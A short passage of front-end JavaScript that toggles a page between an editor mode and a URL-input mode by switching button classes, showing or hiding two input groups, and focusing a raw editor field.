                var groupUrl = document.getElementById('url-group-wrapper');
                var groupEditor = document.getElementById('editor-group');

                if (mode === 'editor') {
                    btnEditor.classList.add('active');
                    btnUrl.classList.remove('active');
                    groupEditor.style.display = 'block';
                    groupUrl.style.display = 'none';
                    setTimeout(() => document.getElementById('raw-editor').focus(), 100);
                } else {
                    btnUrl.classList.add('active');
                    btnEditor.classList.remove('active');
                    groupUrl.style.display = 'block';
                    groupEditor.style.display = 'none';
                }
